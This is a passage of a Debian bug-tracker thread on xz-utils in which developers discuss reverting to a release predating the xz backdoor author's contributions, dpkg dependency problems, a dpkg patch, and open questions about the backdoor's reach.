(Sun, 31 Mar 2024 01:45:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=86), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=86), [link](#85)).

---

[Message #87](#87) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=87), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=87), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Pierre Ynard <linkfanel@yahoo.fr>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 01:36:31 +0000 (UTC)
```
Pierre Ynard dixit:

>version into the Debian archive, as seen in #1067708. To quote Thorsten
>from that thread:
>
>> Very much *not* a fan of NMUs doing large changes such as
>> new upstream versions.
>
>I can't say why exactly he would not be a fan, but with hindsight that
>was an interesting call.

It turned out to indeed be related, although I cannot blame Sebastian
for not spotting it, as well as it was hidden. I actually wrote about
that earlier on Fedi: (Markdown formatting lost here though)

| I was considering replying to this comment on the “please update xz
| package” bugreport earlier with that the discussion is not irrelevant
| and that it’s the maintainer’s responsibility on new upgrades to check
| for new legal issues and “other hidden gems”.
|
| I didn’t because I didn’t want to bother going in with an annoyed
| self-righteous “user”.
|
| Now it turns out all three of the involved ones were “string + number
| @ freemailer” #JiaT75 sockpuppets, so it’s probably okay I didn’t
| bother.
|
| Not that I blame Sebastian — it was very well hidden, and even my
| usual diffing between old and new version would not have found it.
|
| I do take away from this to also check the diff between VCS repo at
| the time of the release and release tarball. Perhaps also between
| branch and tag if they, like Apache Tomcat, introduce extra commits
| there.

>Is xz-utils going to be maintained? Will we want to keep in the archive
>an unmaintained low-level library - low-level as in, susceptible of
>getting pulled as a dependency in lots of places - and rely on it for
>components such as dpkg?

That scenario you describing here would actually be much less of a
problem. The problem comes when the library in that state then does
get updates that probably are not even necessary but shiny enough
people demand them.

bye,
//mirabilos (also a Debian Developer, despite the From)
--
When he found out that the m68k port was in a pretty bad shape, he did
not, like many before him, shrug and move on; instead, he took it upon
himself to start compiling things, just so he could compile his shell.
How's that for dedication. -- Wouter, about my Debian/m68k revival

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 01:45:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=89), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=89), [link](#88)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 01:45:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=91), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=91), [link](#90)).

---

[Message #92](#92) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=92), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=92), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Christoph Anton Mitterer <calestyo@scientia.org>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 01:38:51 +0000 (UTC)
```
Christoph Anton Mitterer dixit:

>Can we be confidently sure that going back to 5.4.5 is enough?

No.

>The last one, still from Lasse Collin seems to be 5.4.1:

In this bugreport, we’re discussing going back to before any
contributions by the adversary. To see whether it’s an option
at all (and it sounds like a sensible step right now) which
joeyh confirmed (thanks).

bye,
//mirabilos
--
22:20⎜<asarch> The crazy that persists in his craziness becomes a master
22:21⎜<asarch> And the distance between the craziness and geniality is
only measured by the success 18:35⎜<asarch> "Psychotics are consistently
inconsistent. The essence of sanity is to be inconsistently inconsistent

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 01:51:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=94), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=94), [link](#93)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 01:51:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=96), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=96), [link](#95)).

---

[Message #97](#97) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=97), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=97), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Christoph Anton Mitterer <calestyo@scientia.org>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 01:46:35 +0000 (UTC)
```
Christoph Anton Mitterer dixit:

>Is anyone on the Debian side trying to figure out how far we've been
>practically affected?

Yes, a multi-team task force is working on it and will inform users
once it is known how to proceed, inclusing how much to throw away
and rebuild.

bye,
//mirabilos
--
„Cool, /usr/share/doc/mksh/examples/uhr.gz ist ja ein Grund,
mksh auf jedem System zu installieren.“
	-- XTaran auf der OpenRheinRuhr, ganz begeistert
(EN: “[…]uhr.gz is a reason to install mksh on every system.”)

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 02:57:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=99), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=99), [link](#98)).

---

**Acknowledgement sent**
to `Joshua Hudson <joshudson@gmail.com>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 02:57:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=101), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=101), [link](#100)).

---

[Message #102](#102) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=102), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=102), reply):

![](/cgi-bin/libravatar.cgi?email=joshudson%40gmail.com)
From: Joshua Hudson <joshudson@gmail.com>
To: 1068024@bugs.debian.org
Subject: Potential solution to your downgrade problem in dpkg
Date: Sat, 30 Mar 2024 19:55:20 -0700
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=102) (text/plain, inline)]
```
```
The dpkg -> xz-utils downgrade problem has a suggestion that suggests
itself.

1) Downgrade dpkg's dependency to the last known good. It doesn't matter
how old so long as it can read the file formats. I understand this is
likely to be 5.4.1.

2) Statically link all the decompressor libraries into dpkg. Yes this means
gzip, bzip2, zstd, and xz's libraries. Today's compile and link time
optimizers are pretty good; it should be able to drop all references to the
compression side pretty much by itself. This would generally be a pretty
good change of its own as it makes the minimal system easier to understand
and the net-install CD smaller.

Then you're free to do what you need to do for all the other dependencies
of xz-utils.

```
```
[[Message part 2](bugreport.cgi?att=1;bug=1068024;msg=102) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 04:57:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=104), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=104), [link](#103)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 04:57:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=106), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=106), [link](#105)).

---

[Message #107](#107) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=107), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=107), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Joshua Hudson <joshudson@gmail.com>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: Potential solution to your downgrade problem in
dpkg
Date: Sun, 31 Mar 2024 04:43:34 +0000 (UTC)
```
Joshua Hudson dixit:

>2) Statically link all the decompressor libraries into dpkg. Yes this means

Totally no.

Also, at this point in time, I’m pretty sure that new external
suggestions are… not very helpful. The situation is being analysed
by a cross-team taskforce, please let them do the already-stressing
job ☻

bye,
//mirabilos
--
/⁀\ The UTF-8 Ribbon
╲ ╱ Campaign against
 ╳  HTML eMail! Also,
╱ ╲ header encryption!

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 20:57:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=109), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=109), [link](#108)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 20:57:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=111), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=111), [link](#110)).

---

[Message #112](#112) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=112), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=112), reply):

![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: Aurelien Jarno <aurelien@aurel32.net>
Cc: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 16:55:11 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=112) (text/plain, inline)]
```
```
Since there's been some discussion about versions, the version in my
xz-unscathed git repository is the same as xz 5.3.2alpha, with the
addition of a fix for [CVE-2022-1271](https://security-tracker.debian.org/tracker/CVE-2022-1271) that did not make it into that
version. (It was fixed in 5.2.6, but 5.3.2alpha was diverged from
5.2.5. Jia Tan was involved in 5.2.6.)

5.2.5 might be a more stable version to revert to; it also predates
Jia Tan's involvement. The [CVE-2022-1271](https://security-tracker.debian.org/tracker/CVE-2022-1271) fix would need to be included.

Note that erofs-utils apparently had a reason to need the 5.3.2alpha
release, so reverting to 5.2.5 would probably cause difficulty with that
package. That dependency versioning information is not included in the
debian sources for erofs-utils BTW. I have not checked compatability
with other packages except for dpkg.

--
see shy jo

```
```
[[signature.asc](bugreport.cgi?att=1;bug=1068024;filename=signature.asc;msg=112) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 21:00:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=114), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=114), [link](#113)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 21:00:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=116), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=116), [link](#115)).

---

[Message #117](#117) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=117), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=117), reply):

![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 16:57:34 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=117) (text/plain, inline)]
```
```
> The situation is being analysed by a cross-team taskforce,
> please let them do the already-stressing job ☻

Sorry, didn't see that before sending my previous message.
I'll leave it to you guys.

--
see shy jo

```
```
[[signature.asc](bugreport.cgi?att=1;bug=1068024;filename=signature.asc;msg=117) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Mon, 01 Apr 2024 00:09:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=119), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=119), [link](#118)).

---

**Acknowledgement sent**
to `noloader@gmail.com`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Mon, 01 Apr 2024 00:09:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=121), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=121), [link](#120)).

---

[Message #122](#122) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=122), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=122), reply):

![](/cgi-bin/libravatar.cgi?email=noloader%40gmail.com)
From: Jeffrey Walton <noloader@gmail.com>
To: 1068024@bugs.debian.org
Date: Sun, 31 Mar 2024 20:07:36 -0400
```
An important comment from oss-security mailing list message,
<<https://www.openwall.com/lists/oss-security/2024/03/31/4>>:

commit f9cf4c05edd14dedfe63833f8ccbe41b55823b00 (HEAD -> master,
origin/master, origin/HEAD)
Author: Lasse Collin <lasse.collin@...aani.org>
Date:   Sat Mar 30 14:36:28 2024 +0200

    CMake: Fix sabotaged Landlock sandbox check.

    It never enabled it.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Tue, 02 Apr 2024 12:39:06 GMT) ([full text](bugreport.cgi?bug=1068024;msg=124), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=124), [link](#123)).

---

**Acknowledgement sent**
to `Guillem Jover <guillem@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Tue, 02 Apr 2024 12:39:06 GMT) ([full text](bugreport.cgi?bug=1068024;msg=126), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=126), [link](#125)).

---

[Message #127](#127) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=127), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=127), reply):

![](/cgi-bin/libravatar.cgi?email=guillem%40debian.org)
From: Guillem Jover <guillem@debian.org>
To: Joey Hess <id@joeyh.name>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Tue, 2 Apr 2024 14:34:20 +0200
```
Hi!

On Sat, 2024-03-30 at 14:16:52 -0400, Joey Hess wrote:
> My git repository is here (note all my commits are gpg signed):
> <https://git.joeyh.name/index.cgi/xz-unscathed/>

> My build of dpkg ended up not being linked to a lzma library at all,
> because liblzmaunscathed is too old to support concurrent decompression,
> which the configure script detects. So dpkg-deb instead uses xz-utils
> to decompress debs. I replaced xz-utils.deb with the one built from my
> fork, and dpkg seems to work fine using it.

dpkg should be able to use an old liblzma w/o multi-threaded compressor
or decompressor support (both are intended to be optionally used if
available). I think the problem might be that you seem to have missed
renaming the .pc.in file, and that does not get included in the -dev
package perhaps, or not picked up then by dpkg with your attached
patch to it? I only checked the renaming commit, didn't check the
packaging nor tried to build it.

(Please do not take this mail as endorsing any specific action, just
wanted to clarify/correct the above.)

Thanks,
Guillem

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Wed, 03 Apr 2024 09:21:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=129), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=129), [link](#128)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Wed, 03 Apr 2024 09:21:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=131), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=131), [link](#130)).

---

[Message #132](#132) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=132), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=132), reply):

![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: Guillem Jover <guillem@debian.org>
Cc: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Wed, 3 Apr 2024 02:55:55 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=132) (text/plain, inline)]
```
```
Guillem Jover wrote:
> dpkg should be able to use an old liblzma w/o multi-threaded compressor
> or decompressor support

Ah you're right. configure did find the library, but I'd missed updating
some ifdefs. Attached updated dpkg patch which does build with the
shared library and works.

--
see shy jo

```
```
[[dpkg.patch](bugreport.cgi?att=1;bug=1068024;filename=dpkg.patch;msg=132) (text/x-diff, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=2;bug=1068024;filename=signature.asc;msg=132) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Wed, 03 Apr 2024 11:09:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=134), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=134), [link](#133)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Wed, 03 Apr 2024 11:09:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=136), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=136), [link](#135)).

---

[Message #137](#137) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=137), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=137), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Joey Hess <id@joeyh.name>, 1068024@bugs.debian.org
Cc: Guillem Jover <guillem@debian.org>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Wed, 3 Apr 2024 11:06:27 +0000 (UTC)
```
Joey Hess dixit:

>--- orig/dpkg-1.22.6/debian/control	2024-03-02 21:30:15.000000000 -0400
>+++ dpkg-1.22.6/debian/control	2024-03-30 13:14:37.746223895 -0400

> # Version needed for multi-threaded decompressor support.
>- liblzma-dev (>= 5.4.0),
>+ liblzmaunscathed-dev,

The comment probably needs adjusting as well.

> # Version needed for multi-threaded decompressor support.
>- xz-utils (>= 5.4.0) <!nocheck>,
>+ xz-utils <!nocheck>,

dito

> # Version needed for multi-threaded decompressor support.
>- liblzma-dev (>= 5.4.0),
>+ liblzmaunscathed-dev,

idem

> # Version needed for multi-threaded decompressor support.
>- xz-utils (>= 5.4.0),
>+ xz-utils,

el mismo

> # Version needed for multi-threaded decompressor support.
>- xz-utils (>= 5.4.0),
>+ xz-utils,

the same

>--- orig/dpkg-1.22.6/debian/libdpkg-dev.install	2024-02-04 22:31:16.000000000 -0400
>+++ dpkg-1.22.6/debian/libdpkg-dev.install	2024-03-30 13:25:27.043840706 -0400
>@@ -1,4 +1,5 @@
> usr/include/dpkg/*.h
>-usr/lib/*/pkgconfig/libdpkg.pc
>-usr/lib/*/libdpkg.a
>+usr/lib/pkgconfig/libdpkg.pc
>+usr/lib/libdpkg.a

Why, exactly, does the library move out of the M-A directory here?
(Probably a question for guillem though.)

>+usr/lib/libdpkg.la

IIRC we were not shipping libtool files, were we? Or am I confusing
this with some BSD ports/packages now?

bye,
//mirabilos
--
[...] if maybe ext3fs wasn't a better pick, or jfs, or maybe reiserfs, oh but
what about xfs, and if only i had waited until reiser4 was ready... in the be-
ginning, there was ffs, and in the middle, there was ffs, and at the end, there
was still ffs, and the sys admins knew it was good. :)  -- Ted Unangst über *fs

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Wed, 03 Apr 2024 19:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=139), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=139), [link](#138)).

---

**Acknowledgement sent**
to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Wed, 03 Apr 2024 19:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=141), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=141), [link](#140)).

---

[Message #142](#142) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=142), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=142), reply):

![](/cgi-bin/libravatar.cgi?email=sebastian%40breakpoint.cc)
From: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
To: Joey Hess <id@joeyh.name>
Cc: Guillem Jover <guillem@debian.org>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Wed, 3 Apr 2024 21:18:57 +0200
```
On 2024-04-02 14:34:20 [+0200], Guillem Jover wrote:
> (Please do not take this mail as endorsing any specific action, just
> wanted to clarify/correct the above.)

Right, same here. The 5.4.x series has threaded decompression which I
would like to keep. The 5.6.x series has branchless decompressor which
improves decompressing performance.

The 5.3.x series is alpha and should not be used in production but only
for testing. I'm not sure what happens with the XZ_5.3..alpha symbols, I
hope they get ignored.

I'm going to poke upstream if there is an audit and or future plans. But
I want to stay on an official upstream release which is also used by
other distros.

> Thanks,
> Guillem

Sebastian

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Mon, 08 Apr 2024 13:39:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=144), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=144), [link](#143)).

---

**Acknowledgement sent**
to `ashim gena <ashimgena12@gmail.com>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Mon, 08 Apr 2024 13:39:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=146), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=146), [link](#145)).

---

[Message #147](#147) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=147), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=147), reply):

![](/cgi-bin/libravatar.cgi?email=ashimgena12%40gmail.com)
From: ashim gena <ashimgena12@gmail.com>
To: 1068024@bugs.debian.org, Ashim Gena <12@gmail.com>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Mon, 8 Apr 2024 10:36:19 +0300
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=147) (text/plain, inline)]
```
```
On Fri, 29 Mar 2024 22:32:23 +0100 Aurelien Jarno <aurelien@aurel32.net>
wrote:
> On 2024-03-29 16:25, Joey Hess wrote:
> > I'd suggest reverting to 5.3.1. Bearing in mind that there were security
> > fixes after that point for ZDI-CAN-16587 that would need to be
reapplied.
>
> Note that reverted to such an old version will break packages that use
> new symbols introduced since then. From a quick look, this is at least:
> - dpkg
> - erofs-utils
> - kmod
>
> Having dpkg in that list means that such downgrade has to be planned
> carefully.
>
> Regards
> Aurelien
>
> --
> Aurelien Jarno                          GPG: 4096R/1DDD8C9B
> aurelien@aurel32.net                     <http://aurel32.net>

mobile

```
```
[[Message part 2](bugreport.cgi?att=1;bug=1068024;msg=147) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 19 Apr 2024 23:09:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=149), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=149), [link](#148)).

---

**Acknowledgement sent**
to `Christoph Anton Mitterer <calestyo@scientia.org>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Fri, 19 Apr 2024 23:09:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=151), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=151), [link](#150)).

---

[Message #152](#152) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=152), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=152), reply):

![](/cgi-bin/libravatar.cgi?email=calestyo%40scientia.org)
From: Christoph Anton Mitterer <calestyo@scientia.org>
To: 1068024@bugs.debian.org
Cc: Thorsten Glaser <tg@mirbsd.de>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sat, 20 Apr 2024 00:54:40 +0200
```
Hey.

On Sun, 2024-03-31 at 01:46 +0000, Thorsten Glaser wrote:
> Yes, a multi-team task force is working on it and will inform users
> once it is known how to proceed, inclusing how much to throw away
> and rebuild.

Kindly wanted to ask whether anything has come out meanwhile of that?

I've tried to follow quite extensively what the various reverse
engineering efforts (e.g. [0], [1], [2], [3]) found out or what's
revealed on index pages like [4] or [5].

It feels as if there are still many discussions about how to prevent
such things in the future, but less so about the concrete fallout of
the particular backdoor, where it seems most people were lead to
conclude from media reports, that an attack was only possible if sshd
was actually running an reachable.

This may of course be true, which would mean that most people are
actually safe and we had quite some luck this time:
- servers, because they run stable distros that haven't had the
  backdoor
- workstations/laptops, because they typically don't run a publicly
  listending sshd

But there are still new findings about the backdoor every now and then,
like that it may read/write on IPC sockets (contained in [2]) and I've
read similar[6] without the restriction on IPC.
Also I've seen some vague statements[7] that it might "install" public
keys (didn't really grasp what was meant there - something like "in
authorized_keys"). And one report[8] talked about it collecting
usernames and IPs and passing the on to some function with unknown
purpose.

It also seems like these effort focus mostly on the 5.6.1 version and
while it's said that the 5.6.0 version is quite similar, who knows the
exact details!?

In any case and (too) long story short:

It would be nice to know whether there's still work done about finding
out whether people who had the malicious code on their systems (in any
version of the backdoor), but
- had sshd not running at all
and/or
- it was not reachable from the internet

can feel safe.

Or whether it may be possible that:
- the backdoor did call home (loaded commands from there, leaked
  private keys or so from the system)
- used completely different vectors not involving sshd
- or somehow else infested the system

Right now people might still have backups to torch their possibly
compromised systems and start over from a safe sate.

So Thorsten, in case you or someone else is aware of any [intermediate]
results from these task forces ([9[) it would be nice to hear about
them or better even in form of some "official" statement from Debian.

Thanks,
Chris.

[0] <https://discord.gg/u6MzmQm5>
[1] <https://github.com/smx-smx/xzre>
[2] <https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor>
[3] <https://securelist.com/xz-backdoor-story-part-1/112354/>
[4] <https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27>
[5] <https://github.com/przemoc/xz-backdoor-links>
    <https://przemoc.github.io/xz-backdoor-links/>  (rendering of that)
[6] <https://discord.com/channels/1223666474091020432/1223666474972090430/1230974749522530304>
[7] <https://discord.com/channels/1223666474091020432/1223666474972090430/1230173131746840606>
[8] <https://isc.sans.edu/diary/30802>
[9] E.g. on d-d <https://lists.debian.org/debian-devel/2024/03/msg00338.html>
    Moritz Mühlenhoff has mentioned that some company was working on it
    and results were expected in some time.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 20 Apr 2024 09:57:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=154), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=154), [link](#153)).

---

**Acknowledgement sent**
to `Boud Roukema <bouddebbug@cosmo.torun.pl>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 20 Apr 2024 09:57:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=156), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=156), [link](#155)).

---

[Message #157](#157) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=157), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=157), reply):

![](/cgi-bin/libravatar.cgi?email=bouddebbug%40cosmo.torun.pl)
From: Boud Roukema <bouddebbug@cosmo.torun.pl>
To: bug 1068024 <1068024@bugs.debian.org>
Cc: Boud Roukema <bouddebbug@cosmo.torun.pl>
Subject: latest Jia-Tan-free xz version seems to be 5.2.5
Date: Sat, 20 Apr 2024 11:49:10 +0200 (CEST)
```
hi all

Leaving aside the questions of dependencies of other Debian packages,
I agree that 5.2.5 looks like the most recent version that is
definitely free of any directly or indirectly authored contributions
by Jia Tan.

<https://salsa.debian.org/debian/xz-utils/-/tree/v5.2.5?ref_type=tags>

In the salsa full source:

$ git checkout v5.2.5
Previous HEAD position was d24a57b7 Bump version and soname for 5.2.7.
HEAD is now at 2327a461 Bump version and soname for 5.2.5.

$ git log --stat --graph |grep "Jia"

# No sign of Jia Tan.

$ git checkout v5.2.6
Previous HEAD position was 2327a461 Bump version and soname for 5.2.5.
